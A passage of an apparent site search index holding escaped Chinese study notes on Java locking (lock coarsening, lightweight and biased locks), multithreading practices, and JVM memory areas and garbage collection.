\u4E0A\u4E00\u8282\u7684\u793A\u4F8B\u4EE3\u7801\u4E2D\u8FDE\u7EED\u7684 append() \u65B9\u6CD5\u5C31\u5C5E\u4E8E\u8FD9\u7C7B\u60C5\u51B5\u3002\u5982\u679C\u865A\u62DF\u673A\u63A2\u6D4B\u5230\u7531\u8FD9\u6837\u7684\u4E00\u4E32\u96F6\u788E\u7684\u64CD\u4F5C\u90FD\u5BF9\u540C\u4E00\u4E2A\u5BF9\u8C61\u52A0\u9501\uFF0C\u5C06\u4F1A\u628A\u52A0\u9501\u7684\u8303\u56F4\u6269\u5C55\uFF08\u7C97\u5316\uFF09\u5230\u6574\u4E2A\u64CD\u4F5C\u5E8F\u5217\u7684\u5916\u90E8\u3002\u5BF9\u4E8E\u4E0A\u4E00\u8282\u7684\u793A\u4F8B\u4EE3\u7801\u5C31\u662F\u6269\u5C55\u5230\u7B2C\u4E00\u4E2A append() \u64CD\u4F5C\u4E4B\u524D\u76F4\u81F3\u6700\u540E\u4E00\u4E2A append() \u64CD\u4F5C\u4E4B\u540E\uFF0C\u8FD9\u6837\u53EA\u9700\u8981\u52A0\u9501\u4E00\u6B21\u5C31\u53EF\u4EE5\u4E86\u3002`},{header:"\u8F7B\u91CF\u7EA7\u9501",slug:"\u8F7B\u91CF\u7EA7\u9501",content:`JDK 1.6 \u5F15\u5165\u4E86\u504F\u5411\u9501\u548C\u8F7B\u91CF\u7EA7\u9501\uFF0C\u4ECE\u800C\u8BA9\u9501\u62E5\u6709\u4E86\u56DB\u4E2A\u72B6\u6001\uFF1A\u65E0\u9501\u72B6\u6001\uFF08unlocked\uFF09\u3001\u504F\u5411\u9501\u72B6\u6001\uFF08biasble\uFF09\u3001\u8F7B\u91CF\u7EA7\u9501\u72B6\u6001\uFF08lightweight locked\uFF09\u548C\u91CD\u91CF\u7EA7\u9501\u72B6\u6001\uFF08inflated\uFF09\u3002
\u4EE5\u4E0B\u662F HotSpot \u865A\u62DF\u673A\u5BF9\u8C61\u5934\u7684\u5185\u5B58\u5E03\u5C40\uFF0C\u8FD9\u4E9B\u6570\u636E\u88AB\u79F0\u4E3A Mark Word\u3002\u5176\u4E2D tag bits \u5BF9\u5E94\u4E86\u4E94\u4E2A\u72B6\u6001\uFF0C\u8FD9\u4E9B\u72B6\u6001\u5728\u53F3\u4FA7\u7684 state \u8868\u683C\u4E2D\u7ED9\u51FA\u3002\u9664\u4E86 marked for gc \u72B6\u6001\uFF0C\u5176\u5B83\u56DB\u4E2A\u72B6\u6001\u5DF2\u7ECF\u5728\u524D\u9762\u4ECB\u7ECD\u8FC7\u4E86\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bb6a49be-00f2-4f27-a0ce-4ed764bc605c.png" width="500)
\u4E0B\u56FE\u5DE6\u4FA7\u662F\u4E00\u4E2A\u7EBF\u7A0B\u7684\u865A\u62DF\u673A\u6808\uFF0C\u5176\u4E2D\u6709\u4E00\u90E8\u5206\u79F0\u4E3A Lock Record \u7684\u533A\u57DF\uFF0C\u8FD9\u662F\u5728\u8F7B\u91CF\u7EA7\u9501\u8FD0\u884C\u8FC7\u7A0B\u521B\u5EFA\u7684\uFF0C\u7528\u4E8E\u5B58\u653E\u9501\u5BF9\u8C61\u7684 Mark Word\u3002\u800C\u53F3\u4FA7\u5C31\u662F\u4E00\u4E2A\u9501\u5BF9\u8C61\uFF0C\u5305\u542B\u4E86 Mark Word \u548C\u5176\u5B83\u4FE1\u606F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/051e436c-0e46-4c59-8f67-52d89d656182.png" width="500)
\u8F7B\u91CF\u7EA7\u9501\u662F\u76F8\u5BF9\u4E8E\u4F20\u7EDF\u7684\u91CD\u91CF\u7EA7\u9501\u800C\u8A00\uFF0C\u5B83\u4F7F\u7528 CAS \u64CD\u4F5C\u6765\u907F\u514D\u91CD\u91CF\u7EA7\u9501\u4F7F\u7528\u4E92\u65A5\u91CF\u7684\u5F00\u9500\u3002\u5BF9\u4E8E\u7EDD\u5927\u90E8\u5206\u7684\u9501\uFF0C\u5728\u6574\u4E2A\u540C\u6B65\u5468\u671F\u5185\u90FD\u662F\u4E0D\u5B58\u5728\u7ADE\u4E89\u7684\uFF0C\u56E0\u6B64\u4E5F\u5C31\u4E0D\u9700\u8981\u90FD\u4F7F\u7528\u4E92\u65A5\u91CF\u8FDB\u884C\u540C\u6B65\uFF0C\u53EF\u4EE5\u5148\u91C7\u7528 CAS \u64CD\u4F5C\u8FDB\u884C\u540C\u6B65\uFF0C\u5982\u679C CAS \u5931\u8D25\u4E86\u518D\u6539\u7528\u4E92\u65A5\u91CF\u8FDB\u884C\u540C\u6B65\u3002
\u5F53\u5C1D\u8BD5\u83B7\u53D6\u4E00\u4E2A\u9501\u5BF9\u8C61\u65F6\uFF0C\u5982\u679C\u9501\u5BF9\u8C61\u6807\u8BB0\u4E3A 0 01\uFF0C\u8BF4\u660E\u9501\u5BF9\u8C61\u7684\u9501\u672A\u9501\u5B9A\uFF08unlocked\uFF09\u72B6\u6001\u3002\u6B64\u65F6\u865A\u62DF\u673A\u5728\u5F53\u524D\u7EBF\u7A0B\u7684\u865A\u62DF\u673A\u6808\u4E2D\u521B\u5EFA Lock Record\uFF0C\u7136\u540E\u4F7F\u7528 CAS \u64CD\u4F5C\u5C06\u5BF9\u8C61\u7684 Mark Word \u66F4\u65B0\u4E3A Lock Record \u6307\u9488\u3002\u5982\u679C CAS \u64CD\u4F5C\u6210\u529F\u4E86\uFF0C\u90A3\u4E48\u7EBF\u7A0B\u5C31\u83B7\u53D6\u4E86\u8BE5\u5BF9\u8C61\u4E0A\u7684\u9501\uFF0C\u5E76\u4E14\u5BF9\u8C61\u7684 Mark Word \u7684\u9501\u6807\u8BB0\u53D8\u4E3A 00\uFF0C\u8868\u793A\u8BE5\u5BF9\u8C61\u5904\u4E8E\u8F7B\u91CF\u7EA7\u9501\u72B6\u6001\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/baaa681f-7c52-4198-a5ae-303b9386cf47.png" width="400)
\u5982\u679C CAS \u64CD\u4F5C\u5931\u8D25\u4E86\uFF0C\u865A\u62DF\u673A\u9996\u5148\u4F1A\u68C0\u67E5\u5BF9\u8C61\u7684 Mark Word \u662F\u5426\u6307\u5411\u5F53\u524D\u7EBF\u7A0B\u7684\u865A\u62DF\u673A\u6808\uFF0C\u5982\u679C\u662F\u7684\u8BDD\u8BF4\u660E\u5F53\u524D\u7EBF\u7A0B\u5DF2\u7ECF\u62E5\u6709\u4E86\u8FD9\u4E2A\u9501\u5BF9\u8C61\uFF0C\u90A3\u5C31\u53EF\u4EE5\u76F4\u63A5\u8FDB\u5165\u540C\u6B65\u5757\u7EE7\u7EED\u6267\u884C\uFF0C\u5426\u5219\u8BF4\u660E\u8FD9\u4E2A\u9501\u5BF9\u8C61\u5DF2\u7ECF\u88AB\u5176\u4ED6\u7EBF\u7A0B\u7EBF\u7A0B\u62A2\u5360\u4E86\u3002\u5982\u679C\u6709\u4E24\u6761\u4EE5\u4E0A\u7684\u7EBF\u7A0B\u4E89\u7528\u540C\u4E00\u4E2A\u9501\uFF0C\u90A3\u8F7B\u91CF\u7EA7\u9501\u5C31\u4E0D\u518D\u6709\u6548\uFF0C\u8981\u81A8\u80C0\u4E3A\u91CD\u91CF\u7EA7\u9501\u3002`},{header:"\u504F\u5411\u9501",slug:"\u504F\u5411\u9501",content:`\u504F\u5411\u9501\u7684\u601D\u60F3\u662F\u504F\u5411\u4E8E\u8BA9\u7B2C\u4E00\u4E2A\u83B7\u53D6\u9501\u5BF9\u8C61\u7684\u7EBF\u7A0B\uFF0C\u8FD9\u4E2A\u7EBF\u7A0B\u5728\u4E4B\u540E\u83B7\u53D6\u8BE5\u9501\u5C31\u4E0D\u518D\u9700\u8981\u8FDB\u884C\u540C\u6B65\u64CD\u4F5C\uFF0C\u751A\u81F3\u8FDE CAS \u64CD\u4F5C\u4E5F\u4E0D\u518D\u9700\u8981\u3002
\u5F53\u9501\u5BF9\u8C61\u7B2C\u4E00\u6B21\u88AB\u7EBF\u7A0B\u83B7\u5F97\u7684\u65F6\u5019\uFF0C\u8FDB\u5165\u504F\u5411\u72B6\u6001\uFF0C\u6807\u8BB0\u4E3A 1 01\u3002\u540C\u65F6\u4F7F\u7528 CAS \u64CD\u4F5C\u5C06\u7EBF\u7A0B ID \u8BB0\u5F55\u5230 Mark Word \u4E2D\uFF0C\u5982\u679C CAS \u64CD\u4F5C\u6210\u529F\uFF0C\u8FD9\u4E2A\u7EBF\u7A0B\u4EE5\u540E\u6BCF\u6B21\u8FDB\u5165\u8FD9\u4E2A\u9501\u76F8\u5173\u7684\u540C\u6B65\u5757\u5C31\u4E0D\u9700\u8981\u518D\u8FDB\u884C\u4EFB\u4F55\u540C\u6B65\u64CD\u4F5C\u3002
\u5F53\u6709\u53E6\u5916\u4E00\u4E2A\u7EBF\u7A0B\u53BB\u5C1D\u8BD5\u83B7\u53D6\u8FD9\u4E2A\u9501\u5BF9\u8C61\u65F6\uFF0C\u504F\u5411\u72B6\u6001\u5C31\u5BA3\u544A\u7ED3\u675F\uFF0C\u6B64\u65F6\u64A4\u9500\u504F\u5411\uFF08Revoke Bias\uFF09\u540E\u6062\u590D\u5230\u672A\u9501\u5B9A\u72B6\u6001\u6216\u8005\u8F7B\u91CF\u7EA7\u9501\u72B6\u6001\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/390c913b-5f31-444f-bbdb-2b88b688e7ce.jpg" width="600)`},{header:"\u5341\u4E09\u3001\u591A\u7EBF\u7A0B\u5F00\u53D1\u826F\u597D\u7684\u5B9E\u8DF5",slug:"\u5341\u4E09\u3001\u591A\u7EBF\u7A0B\u5F00\u53D1\u826F\u597D\u7684\u5B9E\u8DF5",content:"\u7ED9\u7EBF\u7A0B\u8D77\u4E2A\u6709\u610F\u4E49\u7684\u540D\u5B57\uFF0C\u8FD9\u6837\u53EF\u4EE5\u65B9\u4FBF\u627E Bug\u3002 \u7F29\u5C0F\u540C\u6B65\u8303\u56F4\uFF0C\u4ECE\u800C\u51CF\u5C11\u9501\u4E89\u7528\u3002\u4F8B\u5982\u5BF9\u4E8E synchronized\uFF0C\u5E94\u8BE5\u5C3D\u91CF\u4F7F\u7528\u540C\u6B65\u5757\u800C\u4E0D\u662F\u540C\u6B65\u65B9\u6CD5\u3002 \u591A\u7528\u540C\u6B65\u5DE5\u5177\u5C11\u7528 wait() \u548C notify()\u3002\u9996\u5148\uFF0CCountDownLatch, CyclicBarrier, Semaphore \u548C Exchanger \u8FD9\u4E9B\u540C\u6B65\u7C7B\u7B80\u5316\u4E86\u7F16\u7801\u64CD\u4F5C\uFF0C\u800C\u7528 wait() \u548C notify() \u5F88\u96BE\u5B9E\u73B0\u590D\u6742\u63A7\u5236\u6D41\uFF1B\u5176\u6B21\uFF0C\u8FD9\u4E9B\u540C\u6B65\u7C7B\u662F\u7531\u6700\u597D\u7684\u4F01\u4E1A\u7F16\u5199\u548C\u7EF4\u62A4\uFF0C\u5728\u540E\u7EED\u7684 JDK \u4E2D\u8FD8\u4F1A\u4E0D\u65AD\u4F18\u5316\u548C\u5B8C\u5584\u3002 \u4F7F\u7528 BlockingQueue \u5B9E\u73B0\u751F\u4EA7\u8005\u6D88\u8D39\u8005\u95EE\u9898\u3002 \u591A\u7528\u5E76\u53D1\u96C6\u5408\u5C11\u7528\u540C\u6B65\u96C6\u5408\uFF0C\u4F8B\u5982\u5E94\u8BE5\u4F7F\u7528 ConcurrentHashMap \u800C\u4E0D\u662F Hashtable\u3002 \u4F7F\u7528\u672C\u5730\u53D8\u91CF\u548C\u4E0D\u53EF\u53D8\u7C7B\u6765\u4FDD\u8BC1\u7EBF\u7A0B\u5B89\u5168\u3002 \u4F7F\u7528\u7EBF\u7A0B\u6C60\u800C\u4E0D\u662F\u76F4\u63A5\u521B\u5EFA\u7EBF\u7A0B\uFF0C\u8FD9\u662F\u56E0\u4E3A\u521B\u5EFA\u7EBF\u7A0B\u4EE3\u4EF7\u5F88\u9AD8\uFF0C\u7EBF\u7A0B\u6C60\u53EF\u4EE5\u6709\u6548\u5730\u5229\u7528\u6709\u9650\u7684\u7EBF\u7A0B\u6765\u542F\u52A8\u4EFB\u52A1\u3002"},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`BruceEckel. Java \u7F16\u7A0B\u601D\u60F3: \u7B2C 4 \u7248 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2007.
\u5468\u5FD7\u660E. \u6DF1\u5165\u7406\u89E3 Java \u865A\u62DF\u673A [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2011.
Threads and Locks
\u7EBF\u7A0B\u901A\u4FE1
Java \u7EBF\u7A0B\u9762\u8BD5\u9898 Top 50
BlockingQueue
thread state java
CSC 456 Spring 2012/ch7 MN
Java - Understanding Happens-before relationship
6\uC7A5 Thread Synchronization
How is Java's ThreadLocal implemented under the hood?
Concurrent
JAVA FORK JOIN EXAMPLE
\u804A\u804A\u5E76\u53D1\uFF08\u516B\uFF09\u2014\u2014Fork/Join \u6846\u67B6\u4ECB\u7ECD
Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing`}]},{path:"/java/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.html",title:"Java \u865A\u62DF\u673A",pathLocale:"/",contents:[{header:"Java \u865A\u62DF\u673A",slug:"java-\u865A\u62DF\u673A",content:`Java \u865A\u62DF\u673A \u4E00\u3001\u8FD0\u884C\u65F6\u6570\u636E\u533A\u57DF \u7A0B\u5E8F\u8BA1\u6570\u5668
Java \u865A\u62DF\u673A\u6808
\u672C\u5730\u65B9\u6CD5\u6808
\u5806
\u65B9\u6CD5\u533A
\u8FD0\u884C\u65F6\u5E38\u91CF\u6C60
\u76F4\u63A5\u5185\u5B58 \u4E8C\u3001\u5783\u573E\u6536\u96C6 \u5224\u65AD\u4E00\u4E2A\u5BF9\u8C61\u662F\u5426\u53EF\u88AB\u56DE\u6536
\u5F15\u7528\u7C7B\u578B
\u5783\u573E\u6536\u96C6\u7B97\u6CD5
\u5783\u573E\u6536\u96C6\u5668 \u4E09\u3001\u5185\u5B58\u5206\u914D\u4E0E\u56DE\u6536\u7B56\u7565 Minor GC \u548C Full GC
\u5185\u5B58\u5206\u914D\u7B56\u7565
Full GC \u7684\u89E6\u53D1\u6761\u4EF6 \u56DB\u3001\u7C7B\u52A0\u8F7D\u673A\u5236 \u7C7B\u7684\u751F\u547D\u5468\u671F
\u7C7B\u52A0\u8F7D\u8FC7\u7A0B
\u7C7B\u521D\u59CB\u5316\u65F6\u673A
\u7C7B\u4E0E\u7C7B\u52A0\u8F7D\u5668
\u7C7B\u52A0\u8F7D\u5668\u5206\u7C7B
\u53CC\u4EB2\u59D4\u6D3E\u6A21\u578B
\u81EA\u5B9A\u4E49\u7C7B\u52A0\u8F7D\u5668\u5B9E\u73B0 \u53C2\u8003\u8D44\u6599 \u672C\u6587\u5927\u90E8\u5206\u5185\u5BB9\u53C2\u8003 \u5468\u5FD7\u660E\u300A\u6DF1\u5165\u7406\u89E3 Java \u865A\u62DF\u673A\u300B \uFF0C\u60F3\u8981\u6DF1\u5165\u5B66\u4E60\u7684\u8BDD\u8BF7\u770B\u539F\u4E66\u3002`},{header:"\u4E00\u3001\u8FD0\u884C\u65F6\u6570\u636E\u533A\u57DF",slug:"\u4E00\u3001\u8FD0\u884C\u65F6\u6570\u636E\u533A\u57DF",content:""},{header:"\u7A0B\u5E8F\u8BA1\u6570\u5668",slug:"\u7A0B\u5E8F\u8BA1\u6570\u5668",content:"\u8BB0\u5F55\u6B63\u5728\u6267\u884C\u7684\u865A\u62DF\u673A\u5B57\u8282\u7801\u6307\u4EE4\u7684\u5730\u5740\uFF08\u5982\u679C\u6B63\u5728\u6267\u884C\u7684\u662F\u672C\u5730\u65B9\u6CD5\u5219\u4E3A\u7A7A\uFF09\u3002"},{header:"Java \u865A\u62DF\u673A\u6808",slug:"java-\u865A\u62DF\u673A\u6808",content:`\u6BCF\u4E2A Java \u65B9\u6CD5\u5728\u6267\u884C\u7684\u540C\u65F6\u4F1A\u521B\u5EFA\u4E00\u4E2A\u6808\u5E27\u7528\u4E8E\u5B58\u50A8\u5C40\u90E8\u53D8\u91CF\u8868\u3001\u64CD\u4F5C\u6570\u6808\u3001\u5E38\u91CF\u6C60\u5F15\u7528\u7B49\u4FE1\u606F\u3002\u4ECE\u65B9\u6CD5\u8C03\u7528\u76F4\u81F3\u6267\u884C\u5B8C\u6210\u7684\u8FC7\u7A0B\uFF0C\u5BF9\u5E94\u7740\u4E00\u4E2A\u6808\u5E27\u5728 Java \u865A\u62DF\u673A\u6808\u4E2D\u5165\u6808\u548C\u51FA\u6808\u7684\u8FC7\u7A0B\u3002 \u53EF\u4EE5\u901A\u8FC7 -Xss \u8FD9\u4E2A\u865A\u62DF\u673A\u53C2\u6570\u6765\u6307\u5B9A\u6BCF\u4E2A\u7EBF\u7A0B\u7684 Java \u865A\u62DF\u673A\u6808\u5185\u5B58\u5927\u5C0F\uFF0C\u5728 JDK 1.4 \u4E2D\u9ED8\u8BA4\u4E3A 256K\uFF0C\u800C\u5728 JDK 1.5+ \u9ED8\u8BA4\u4E3A 1M\uFF1A
java -Xss2M HackTheJava
\u8BE5\u533A\u57DF\u53EF\u80FD\u629B\u51FA\u4EE5\u4E0B\u5F02\u5E38\uFF1A \u5F53\u7EBF\u7A0B\u8BF7\u6C42\u7684\u6808\u6DF1\u5EA6\u8D85\u8FC7\u6700\u5927\u503C\uFF0C\u4F1A\u629B\u51FA StackOverflowError \u5F02\u5E38\uFF1B
\u6808\u8FDB\u884C\u52A8\u6001\u6269\u5C55\u65F6\u5982\u679C\u65E0\u6CD5\u7533\u8BF7\u5230\u8DB3\u591F\u5185\u5B58\uFF0C\u4F1A\u629B\u51FA OutOfMemoryError \u5F02\u5E38\u3002`},{header:"\u672C\u5730\u65B9\u6CD5\u6808",slug:"\u672C\u5730\u65B9\u6CD5\u6808",content:`\u672C\u5730\u65B9\u6CD5\u6808\u4E0E Java \u865A\u62DF\u673A\u6808\u7C7B\u4F3C\uFF0C\u5B83\u4EEC\u4E4B\u95F4\u7684\u533A\u522B\u53EA\u4E0D\u8FC7\u662F\u672C\u5730\u65B9\u6CD5\u6808\u4E3A\u672C\u5730\u65B9\u6CD5\u670D\u52A1\u3002
\u672C\u5730\u65B9\u6CD5\u4E00\u822C\u662F\u7528\u5176\u5B83\u8BED\u8A00\uFF08C\u3001C++ \u6216\u6C47\u7F16\u8BED\u8A00\u7B49\uFF09\u7F16\u5199\u7684\uFF0C\u5E76\u4E14\u88AB\u7F16\u8BD1\u4E3A\u57FA\u4E8E\u672C\u673A\u786C\u4EF6\u548C\u64CD\u4F5C\u7CFB\u7EDF\u7684\u7A0B\u5E8F\uFF0C\u5BF9\u5F85\u8FD9\u4E9B\u65B9\u6CD5\u9700\u8981\u7279\u522B\u5904\u7406\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66a6899d-c6b0-4a47-8569-9d08f0baf86c.png>>>" width="300px">`},{header:"\u5806",slug:"\u5806",content:`\u6240\u6709\u5BF9\u8C61\u90FD\u5728\u8FD9\u91CC\u5206\u914D\u5185\u5B58\uFF0C\u662F\u5783\u573E\u6536\u96C6\u7684\u4E3B\u8981\u533A\u57DF\uFF08"GC \u5806"\uFF09\u3002
\u73B0\u4EE3\u7684\u5783\u573E\u6536\u96C6\u5668\u57FA\u672C\u90FD\u662F\u91C7\u7528\u5206\u4EE3\u6536\u96C6\u7B97\u6CD5\uFF0C\u5176\u4E3B\u8981\u7684\u601D\u60F3\u662F\u9488\u5BF9\u4E0D\u540C\u7C7B\u578B\u7684\u5BF9\u8C61\u91C7\u53D6\u4E0D\u540C\u7684\u5783\u573E\u56DE\u6536\u7B97\u6CD5\u3002\u53EF\u4EE5\u5C06\u5806\u5206\u6210\u4E24\u5757\uFF1A \u65B0\u751F\u4EE3\uFF08Young Generation\uFF09
\u8001\u5E74\u4EE3\uFF08Old Generation\uFF09 \u5806\u4E0D\u9700\u8981\u8FDE\u7EED\u5185\u5B58\uFF0C\u5E76\u4E14\u53EF\u4EE5\u52A8\u6001\u589E\u52A0\u5176\u5185\u5B58\uFF0C\u589E\u52A0\u5931\u8D25\u4F1A\u629B\u51FA OutOfMemoryError \u5F02\u5E38\u3002
\u53EF\u4EE5\u901A\u8FC7 -Xms \u548C -Xmx \u8FD9\u4E24\u4E2A\u865A\u62DF\u673A\u53C2\u6570\u6765\u6307\u5B9A\u4E00\u4E2A\u7A0B\u5E8F\u7684\u5806\u5185\u5B58\u5927\u5C0F\uFF0C\u7B2C\u4E00\u4E2A\u53C2\u6570\u8BBE\u7F6E\u521D\u59CB\u503C\uFF0C\u7B2C\u4E8C\u4E2A\u53C2\u6570\u8BBE\u7F6E\u6700\u5927\u503C\u3002
java -Xms1M -Xmx2M HackTheJava`},{header:"\u65B9\u6CD5\u533A",slug:"\u65B9\u6CD5\u533A",content:`\u7528\u4E8E\u5B58\u653E\u5DF2\u88AB\u52A0\u8F7D\u7684\u7C7B\u4FE1\u606F\u3001\u5E38\u91CF\u3001\u9759\u6001\u53D8\u91CF\u3001\u5373\u65F6\u7F16\u8BD1\u5668\u7F16\u8BD1\u540E\u7684\u4EE3\u7801\u7B49\u6570\u636E\u3002
\u548C\u5806\u4E00\u6837\u4E0D\u9700\u8981\u8FDE\u7EED\u7684\u5185\u5B58\uFF0C\u5E76\u4E14\u53EF\u4EE5\u52A8\u6001\u6269\u5C55\uFF0C\u52A8\u6001\u6269\u5C55\u5931\u8D25\u4E00\u6837\u4F1A\u629B\u51FA OutOfMemoryError \u5F02\u5E38\u3002
\u5BF9\u8FD9\u5757\u533A\u57DF\u8FDB\u884C\u5783\u573E\u56DE\u6536\u7684\u4E3B\u8981\u76EE\u6807\u662F\u5BF9\u5E38\u91CF\u6C60\u7684\u56DE\u6536\u548C\u5BF9\u7C7B\u7684\u5378\u8F7D\uFF0C\u4F46\u662F\u4E00\u822C\u6BD4\u8F83\u96BE\u5B9E\u73B0\u3002
HotSpot \u865A\u62DF\u673A\u628A\u5B83\u5F53\u6210\u6C38\u4E45\u4EE3\u6765\u8FDB\u884C\u5783\u573E\u56DE\u6536\u3002\u4F46\u5F88\u96BE\u786E\u5B9A\u6C38\u4E45\u4EE3\u7684\u5927\u5C0F\uFF0C\u56E0\u4E3A\u5B83\u53D7\u5230\u5F88\u591A\u56E0\u7D20\u5F71\u54CD\uFF0C\u5E76\u4E14\u6BCF\u6B21 Full GC \u4E4B\u540E\u6C38\u4E45\u4EE3\u7684\u5927\u5C0F\u90FD\u4F1A\u6539\u53D8\uFF0C\u6240\u4EE5\u7ECF\u5E38\u4F1A\u629B\u51FA OutOfMemoryError \u5F02\u5E38\u3002\u4E3A\u4E86\u66F4\u5BB9\u6613\u7BA1\u7406\u65B9\u6CD5\u533A\uFF0C\u4ECE JDK 1.8 \u5F00\u59CB\uFF0C\u79FB\u9664\u6C38\u4E45\u4EE3\uFF0C\u5E76\u628A\u65B9\u6CD5\u533A\u79FB\u81F3\u5143\u7A7A\u95F4\uFF0C\u5B83\u4F4D\u4E8E\u672C\u5730\u5185\u5B58\u4E2D\uFF0C\u800C\u4E0D\u662F\u865A\u62DF\u673A\u5185\u5B58\u4E2D\u3002
\u65B9\u6CD5\u533A\u662F\u4E00\u4E2A JVM \u89C4\u8303\uFF0C\u6C38\u4E45\u4EE3\u4E0E\u5143\u7A7A\u95F4\u90FD\u662F\u5176\u4E00\u79CD\u5B9E\u73B0\u65B9\u5F0F\u3002\u5728 JDK 1.8 \u4E4B\u540E\uFF0C\u539F\u6765\u6C38\u4E45\u4EE3\u7684\u6570\u636E\u88AB\u5206\u5230\u4E86\u5806\u548C\u5143\u7A7A\u95F4\u4E2D\u3002\u5143\u7A7A\u95F4\u5B58\u50A8\u7C7B\u7684\u5143\u4FE1\u606F\uFF0C\u9759\u6001\u53D8\u91CF\u548C\u5E38\u91CF\u6C60\u7B49\u653E\u5165\u5806\u4E2D\u3002`},{header:"\u8FD0\u884C\u65F6\u5E38\u91CF\u6C60",slug:"\u8FD0\u884C\u65F6\u5E38\u91CF\u6C60",content:`\u8FD0\u884C\u65F6\u5E38\u91CF\u6C60\u662F\u65B9\u6CD5\u533A\u7684\u4E00\u90E8\u5206\u3002
Class \u6587\u4EF6\u4E2D\u7684\u5E38\u91CF\u6C60\uFF08\u7F16\u8BD1\u5668\u751F\u6210\u7684\u5B57\u9762\u91CF\u548C\u7B26\u53F7\u5F15\u7528\uFF09\u4F1A\u5728\u7C7B\u52A0\u8F7D\u540E\u88AB\u653E\u5165\u8FD9\u4E2A\u533A\u57DF\u3002
\u9664\u4E86\u5728\u7F16\u8BD1\u671F\u751F\u6210\u7684\u5E38\u91CF\uFF0C\u8FD8\u5141\u8BB8\u52A8\u6001\u751F\u6210\uFF0C\u4F8B\u5982 String \u7C7B\u7684 intern()\u3002`},{header:"\u76F4\u63A5\u5185\u5B58",slug:"\u76F4\u63A5\u5185\u5B58",content:"\u5728 JDK 1.4 \u4E2D\u65B0\u5F15\u5165\u4E86 NIO \u7C7B\uFF0C\u5B83\u53EF\u4EE5\u4F7F\u7528 Native \u51FD\u6570\u5E93\u76F4\u63A5\u5206\u914D\u5806\u5916\u5185\u5B58\uFF0C\u7136\u540E\u901A\u8FC7 Java \u5806\u91CC\u7684 DirectByteBuffer \u5BF9\u8C61\u4F5C\u4E3A\u8FD9\u5757\u5185\u5B58\u7684\u5F15\u7528\u8FDB\u884C\u64CD\u4F5C\u3002\u8FD9\u6837\u80FD\u5728\u4E00\u4E9B\u573A\u666F\u4E2D\u663E\u8457\u63D0\u9AD8\u6027\u80FD\uFF0C\u56E0\u4E3A\u907F\u514D\u4E86\u5728\u5806\u5185\u5B58\u548C\u5806\u5916\u5185\u5B58\u6765\u56DE\u62F7\u8D1D\u6570\u636E\u3002"},{header:"\u4E8C\u3001\u5783\u573E\u6536\u96C6",slug:"\u4E8C\u3001\u5783\u573E\u6536\u96C6",content:"\u5783\u573E\u6536\u96C6\u4E3B\u8981\u662F\u9488\u5BF9\u5806\u548C\u65B9\u6CD5\u533A\u8FDB\u884C\u3002\u7A0B\u5E8F\u8BA1\u6570\u5668\u3001\u865A\u62DF\u673A\u6808\u548C\u672C\u5730\u65B9\u6CD5\u6808\u8FD9\u4E09\u4E2A\u533A\u57DF\u5C5E\u4E8E\u7EBF\u7A0B\u79C1\u6709\u7684\uFF0C\u53EA\u5B58\u5728\u4E8E\u7EBF\u7A0B\u7684\u751F\u547D\u5468\u671F\u5185\uFF0C\u7EBF\u7A0B\u7ED3\u675F\u4E4B\u540E\u5C31\u4F1A\u6D88\u5931\uFF0C\u56E0\u6B64\u4E0D\u9700\u8981\u5BF9\u8FD9\u4E09\u4E2A\u533A\u57DF\u8FDB\u884C\u5783\u573E\u56DE\u6536\u3002"},{header:"\u5224\u65AD\u4E00\u4E2A\u5BF9\u8C61\u662F\u5426\u53EF\u88AB\u56DE\u6536",slug:"\u5224\u65AD\u4E00\u4E2A\u5BF9\u8C61\u662F\u5426\u53EF\u88AB\u56DE\u6536",content:""},{header:"1. \u5F15\u7528\u8BA1\u6570\u7B97\u6CD5",slug:"_1-\u5F15\u7528\u8BA1\u6570\u7B97\u6CD5",content:`\u4E3A\u5BF9\u8C61\u6DFB\u52A0\u4E00\u4E2A\u5F15\u7528\u8BA1\u6570\u5668\uFF0C\u5F53\u5BF9\u8C61\u589E\u52A0\u4E00\u4E2A\u5F15\u7528\u65F6\u8BA1\u6570\u5668\u52A0 1\uFF0C\u5F15\u7528\u5931\u6548\u65F6\u8BA1\u6570\u5668\u51CF 1\u3002\u5F15\u7528\u8BA1\u6570\u4E3A 0 \u7684\u5BF9\u8C61\u53EF\u88AB\u56DE\u6536\u3002
\u5728\u4E24\u4E2A\u5BF9\u8C61\u51FA\u73B0\u5FAA\u73AF\u5F15\u7528\u7684\u60C5\u51B5\u4E0B\uFF0C\u6B64\u65F6\u5F15\u7528\u8BA1\u6570\u5668\u6C38\u8FDC\u4E0D\u4E3A 0\uFF0C\u5BFC\u81F4\u65E0\u6CD5\u5BF9\u5B83\u4EEC\u8FDB\u884C\u56DE\u6536\u3002\u6B63\u662F\u56E0\u4E3A\u5FAA\u73AF\u5F15\u7528\u7684\u5B58\u5728\uFF0C\u56E0\u6B64 Java \u865A\u62DF\u673A\u4E0D\u4F7F\u7528\u5F15\u7528\u8BA1\u6570\u7B97\u6CD5\u3002
public class Test { public Object instance = null; public static void main(String[] args) { Test a = new Test(); Test b = new Test(); a.instance = b; b.instance = a; a = null; b = null; doSomething(); }
}
